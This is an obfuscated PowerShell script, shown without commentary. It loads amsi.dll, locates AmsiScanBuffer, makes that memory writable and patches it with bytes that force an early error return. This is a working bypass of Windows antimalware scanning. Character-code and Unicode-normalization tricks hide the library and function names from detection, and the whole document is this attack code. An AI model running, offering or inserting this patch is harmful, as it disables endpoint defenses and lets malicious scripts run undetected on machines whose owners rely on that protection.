$Jp9end1GWwOgnYWeYx = @"
using System;
using System.Runtime.InteropServices;
public class Jp9end1GWwOgnYWeYx {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr o1B2OhL, string wvLUebbnp0Q);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ADOACQVl_2vSCxEtW, UIntPtr wfdGp6FUHrx, uint OU3OPejB, out uint iJaZS);
}
"@

Add-Type $Jp9end1GWwOgnYWeYx

$KQuIEqasCixF3QiuqJ01 = [Jp9end1GWwOgnYWeYx]::LoadLibrary("$(('ámsí.d'+'ll').normaliZE([cHAr](70+17-17)+[CHAR](111+2-2)+[CHAr]([BYTE]0x72)+[cHAr](109+43-43)+[chAR](68+65-65)) -replace [CHaR]([Byte]0x5c)+[cHAr](112+11-11)+[CHAR](123)+[chaR](77)+[ChAr](110)+[CHar]([BYTE]0x7d))")
$ZDXHdK8gZiqIPU = [Jp9end1GWwOgnYWeYx]::GetProcAddress($KQuIEqasCixF3QiuqJ01, "$(('ÁmsìScänBûff'+'êr').NormaLize([chaR]([BYTe]0x46)+[CHAR]([bYtE]0x6f)+[CHaR]([BYTe]0x72)+[char]([BYtE]0x6d)+[CHAR](68)) -replace [ChAr]([bYtE]0x5c)+[cHAr](61+51)+[Char](27+96)+[cHAR]([byTe]0x4d)+[Char]([BYTe]0x6e)+[cHAR](125+108-108))")
$p = 0
[Jp9end1GWwOgnYWeYx]::VirtualProtect($ZDXHdK8gZiqIPU, [uint32]5, 0x40, [ref]$p)
$eq08gqD93rkxIJR = "0xB8"
$wPCwXsTD6yjZ = "0x57"
$oonh = "0x00"
$iYDEmBM = "0x07"
$UwJPQ = "0x80"
$Ut1L6G9fg12I = "0xC3"
$UrZrNG0hzS37p = [Byte[]] ($eq08gqD93rkxIJR,$wPCwXsTD6yjZ,$oonh,$iYDEmBM,+$UwJPQ,+$Ut1L6G9fg12I)
[System.Runtime.InteropServices.Marshal]::Copy($UrZrNG0hzS37p, 0, $ZDXHdK8gZiqIPU, 6)